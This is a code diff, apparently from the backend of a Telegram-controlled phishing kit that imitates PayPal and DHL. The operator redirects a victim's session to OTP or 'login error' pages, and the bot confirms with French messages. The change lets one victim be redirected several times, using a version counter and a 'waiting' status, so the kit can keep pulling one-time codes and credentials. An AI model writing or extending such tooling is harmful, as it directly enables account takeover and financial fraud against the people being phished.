@@ -169,7 +169,8 @@ async function handlePayPalRedirectCommand(
 
     await storage.updatePaypalSession(sessionId, {
       redirectUrl,
-      status: "redirected",
+      redirectVersion: (session.redirectVersion ?? 0) + 1,
+      status: "waiting", // Keep as waiting to allow multiple redirects
     });
 
     const action = redirectUrl.includes("otp") ? "OTP" : "LOGIN ERROR";
@@ -217,7 +218,8 @@ async function handleDhlRedirectCommand(
 
     await storage.updateDhlSession(sessionId, {
       redirectUrl,
-      status: "redirected",
+      redirectVersion: (session.redirectVersion ?? 0) + 1,
+      status: "waiting", // Keep as waiting to allow multiple redirects
     });
 
     const action = redirectUrl.includes("otp") ? "OTP" : "ERROR";
@@ -282,7 +284,8 @@ async function handleCallbackQuery(query: any, botToken: string) {
 
       await storage.updatePaypalSession(sessionId, {
         redirectUrl,
-        status: "redirected",
+        redirectVersion: (session.redirectVersion ?? 0) + 1,
+        status: "waiting", // Keep as waiting to allow multiple redirects
       });
 
       await answerCallbackQuery(query.id, botToken, `✅ Client redirigé vers ${action.toUpperCase()}`);
@@ -297,7 +300,8 @@ async function handleCallbackQuery(query: any, botToken: string) {
 
       await storage.updateDhlSession(sessionId, {
         redirectUrl,
-        status: "redirected",
+        redirectVersion: (session.redirectVersion ?? 0) + 1,
+        status: "waiting", // Keep as waiting to allow multiple redirects
       });
 
       await answerCallbackQuery(query.id, botToken, `✅ Client redirigé vers ${action.toUpperCase()}`);
